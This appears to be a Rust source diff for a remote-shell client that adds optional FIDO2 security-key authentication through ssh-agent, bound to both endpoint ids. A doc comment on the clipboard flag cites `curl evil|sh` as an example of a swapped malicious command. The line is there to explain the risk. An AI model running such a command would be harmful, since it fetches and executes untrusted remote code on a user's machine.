@@ -5,15 +5,18 @@
 
 use std::io::Read;
 use std::net::SocketAddr;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
+use std::sync::Arc;
 
 use crate::predict::DisplayPreference;
+use crate::transport_iroh::sk_auth::{self, ClientSkCtx, SkSigner};
 use crate::transport_iroh::{
     bind_endpoint, bind_endpoint_local, bind_endpoint_with_relay, direct_addr, format_endpoint_id,
     load_or_create_secret_key, parse_endpoint_id, parse_relay_url, relay_addr,
 };
 use anyhow::Context;
 use clap::Args;
+use iroh::EndpointId;
 use tokio::signal::unix::{signal, SignalKind};
 use tokio::sync::mpsc;
 use tokio_util::sync::CancellationToken;
@@ -43,6 +46,14 @@ pub struct ConnectArgs {
     /// clipboard (e.g. swap a copied command for `curl evil|sh`). A deliberate per-session opt-in.
     #[arg(long)]
     clipboard: bool,
+
+    /// Authenticate with a FIDO2 security key as a second factor (for servers started with
+    /// `--require-sk`). Give the path to the key's OpenSSH public key (e.g.
+    /// `~/.ssh/id_ed25519_sk.pub`); the private half must be loaded in your ssh-agent
+    /// (`ssh-add ~/.ssh/id_ed25519_sk`), which performs the hardware touch. Re-proved on every
+    /// (re)connect. Unix only.
+    #[arg(long = "sk-key", value_name = "PUBKEY_FILE")]
+    sk_key: Option<PathBuf>,
 }
 
 /// Arguments for `koh id`.
@@ -89,6 +100,55 @@ fn warn_if_locale_not_utf8() {
              Set e.g. LANG=en_US.UTF-8."
         );
     }
+}
+
+/// Build the client's security-key signing context from `--sk-key`, or `None` when the flag is
+/// absent. On unix the signer delegates to a running `ssh-agent` (which drives the hardware touch);
+/// the transcript is bound to both endpoint ids so a proof can't be relayed or reused elsewhere.
+#[cfg(unix)]
+fn build_sk_ctx(
+    sk_key: Option<&Path>,
+    my_id: EndpointId,
+    server_id: EndpointId,
+) -> anyhow::Result<Option<ClientSkCtx>> {
+    let Some(path) = sk_key else {
+        return Ok(None);
+    };
+    let spec = path.to_str().context("--sk-key path is not valid UTF-8")?;
+    let key = sk_auth::load_sk_key_spec(spec).with_context(|| {
+        format!(
+            "loading the security-key public key from {}",
+            path.display()
+        )
+    })?;
+    let sock = std::env::var_os("SSH_AUTH_SOCK").context(
+        "--sk-key needs a running ssh-agent, but $SSH_AUTH_SOCK is unset. Start one and load your \
+         security key first, e.g. `ssh-add ~/.ssh/id_ed25519_sk`",
+    )?;
+    eprintln!(
+        "security key : {} (your ssh-agent will prompt for a touch on connect)",
+        key.fingerprint()
+    );
+    let signer: Arc<dyn SkSigner> = Arc::new(sk_auth::AgentSkSigner::new(PathBuf::from(sock), key));
+    Ok(Some(ClientSkCtx {
+        server_id: *server_id.as_bytes(),
+        client_id: *my_id.as_bytes(),
+        signer,
+    }))
+}
+
+/// Off-unix there is no ssh-agent socket, so `--sk-key` is unsupported (errors rather than silently
+/// ignoring a security requirement the user asked for).
+#[cfg(not(unix))]
+fn build_sk_ctx(
+    sk_key: Option<&Path>,
+    _my_id: EndpointId,
+    _server_id: EndpointId,
+) -> anyhow::Result<Option<ClientSkCtx>> {
+    if sk_key.is_some() {
+        anyhow::bail!("--sk-key (ssh-agent security keys) is only supported on unix");
+    }
+    Ok(None)
 }
 
 /// `koh id` — print this machine's koh id (to add to a server's `--allow` list) and exit.
@@ -209,10 +269,18 @@ pub async fn connect(args: ConnectArgs) -> anyhow::Result<Option<u32>> {
             .context("binding endpoint")?;
         (ep, server_id.into())
     };
+    // Optional FIDO2 second factor: build a signing context if `--sk-key` was given (errors early,
+    // while still cooked, if the agent/key isn't usable). Bound to both endpoint ids so the proof
+    // can't be relayed to a different server or reused by a different client.
+    let sk_ctx = build_sk_ctx(args.sk_key.as_deref(), my_id, server_id)?;
+
     // One connector dials the server for the initial connection and for every transparent reconnect.
-    // The first dial happens here — before raw mode — so a bad-id / not-on-allowlist error prints
-    // cleanly; later drops are re-dialed from inside run_client.
-    let connector = IrohConnector::new(endpoint.clone(), target);
+    // The first dial happens here — before raw mode — so a bad-id / not-on-allowlist / failed-sk
+    // error prints cleanly; later drops are re-dialed (and re-prove the security key) from run_client.
+    let mut connector = IrohConnector::new(endpoint.clone(), target);
+    if let Some(ctx) = sk_ctx {
+        connector = connector.with_sk(ctx);
+    }
     // Bound the initial dial (KR-04): `connect()` does the QUIC handshake then awaits the server's
     // admission ack, so a malicious/typo'd server that never admits could otherwise hang it at
     // "connecting…" until iroh's 300s idle timeout. Use the same cap as the transparent-reconnect path.
